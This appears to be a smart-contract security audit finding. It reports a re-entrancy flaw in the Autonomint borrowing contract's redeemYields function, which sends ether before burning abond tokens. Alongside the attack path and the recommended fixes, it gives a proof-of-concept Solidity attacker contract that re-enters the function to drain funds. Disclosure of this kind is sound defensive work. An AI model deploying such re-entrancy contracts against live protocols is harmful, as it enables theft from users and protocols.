# `borrowing::redeemYields` is prone to re-entrancy leading to loss of funds

### Summary

The [`borrowing::redeemYields`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L318) is used to redeem yields by burning abond tokens.
However, the [`BorrowLib::redeemYields`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L978) does not follow CEI pattern, transferring ether before burning the abond tokens.
```solidity
function redeemYields(
        address user,
        uint128 aBondAmount,
        address usdaAddress,
        address abondAddress,
        address treasuryAddress,
        address borrow
    ) public returns (uint256) {
       
        // withdraw eth from ext protocol
        uint256 withdrawAmount = treasury.withdrawFromExternalProtocol(user,aBondAmount); <@ - // The ether is transferred to the user here

        //Burn the abond from user
        bool success = abond.burnFromUser(msg.sender, aBondAmount); <@ - // The tokens are burnt later
        if (!success) revert IBorrowing.Borrow_BurnFailed();

        return withdrawAmount;
    }
```
Hence, this allows an attacker to withdraw as much ether as possible by re-entering.

### Root Cause

In [`borrowing.sol:321`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L321), there is a lack of `nonReentrant` modifier or any sort of re-entrancy protection mechanism like CEI.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. User deploys an attacker contract that calls the `borrowing::redeemYields` with it's own address.
2. This attacker contract will receive ether as the `treasury::withdrawFromExternalProtocol` is called inside the `borrower::redeemYields`
3. The attacker contract re-enters by calling `borrowing::redeemYields`.
4. This allows multiple redeems without burning the abond tokens more than once.

### Impact

1. Allows attacker to drain funds by leveraging re-entrancy avoiding burning much abond tokens.

### PoC

Below is a sample re-entrancy contract that can be used
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBorrowing {
    function redeemYields(address user, uint128 aBondAmount) external returns (uint256);
}

contract MaliciousAttacker {
    IBorrowing public borrowingContract;
    uint128 public aBondAmount;
    bool private isReentering;
    address public owner;

    constructor(address _borrowingContract) {
        borrowingContract = IBorrowing(_borrowingContract);
    }

    // Function to initiate the attack
    function initiateReentry(uint128 _aBondAmount) external payable {

        aBondAmount = _aBondAmount;
        isReentering = true;

        // First call to redeemYields
        borrowingContract.redeemYields(address(this), aBondAmount);
    }

    // This receive function will be triggered when ETH is received
    receive() external payable {
        if (isReentering && address(borrowingContract).balance > 0) {
            isReentering = false; // Prevent infinite recursion
            borrowingContract.redeemYields(address(this), aBondAmount);
        }
    }

}
```

### Mitigation

It is recommended to use a `nonReentrant` modifier and implement CEI pattern.
